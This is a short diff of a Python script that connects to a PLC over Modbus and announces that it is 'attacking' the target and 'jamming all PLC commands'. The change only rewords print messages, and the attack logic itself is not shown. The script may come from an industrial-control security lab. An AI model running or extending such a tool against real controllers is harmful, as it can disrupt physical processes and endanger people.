@@ -42,12 +42,13 @@ log.setLevel(logging.INFO)
 
 #####################################
 # Code
-#####################################
+#####################################git c
 client = ModbusClient(args.target, port=5020)
 
 try:
     client.connect()
-    print "Connecting to PLC . . . Please wait "
+    print ". . . Connecting to PLC"
+    print ". . . Please wait."
     time.sleep(3)
     print ". . . Attacking PLC at " + args.target
     print ". . . Jamming all PLC commands!"
